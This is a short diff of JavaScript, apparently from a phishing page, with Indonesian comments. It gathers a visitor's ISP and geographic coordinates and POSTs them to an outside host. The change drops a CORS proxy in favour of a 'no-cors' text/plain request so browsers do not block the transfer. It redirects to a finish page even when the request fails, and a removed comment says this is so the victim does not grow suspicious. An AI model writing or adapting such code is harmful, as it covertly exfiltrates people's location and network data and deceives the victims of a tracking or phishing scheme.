@@ -103,10 +103,11 @@
             payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            // PAKE PROXY CORS BIAR GA DIBLOKIR SAFARI
-            return fetch("https://corsproxy.io/?url=https://websetting.my.id/api/send", {
+            // TRIK NO-CORS & TEXT/PLAIN
+            return fetch("https://websetting.my.id/api/send", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                mode: "no-cors",
+                headers: { "Content-Type": "text/plain" },
                 body: JSON.stringify(payload)
             });
         })
@@ -115,7 +116,6 @@
             window.location.href = "selesai.html";
         })
         .catch(function(err){
-            // KALO ERROR TETEP LANJUT BIAR KORBAN GA CURIGA
             window.location.href = "selesai.html";
         });
   }
